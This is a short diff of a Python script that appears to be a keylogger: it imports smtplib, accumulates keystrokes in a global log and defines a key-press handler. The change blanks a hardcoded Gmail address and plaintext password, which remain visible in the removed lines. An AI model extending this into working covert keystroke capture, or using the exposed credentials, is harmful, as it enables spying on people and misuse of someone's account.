@@ -3,8 +3,8 @@ import threading
 import smtplib
 
 log = ""
-email = "trialu70@gmail.com"
-password = "abc@123AB"
+email = ""
+password = ""
 def process_key_press(key):
     global log
     try:
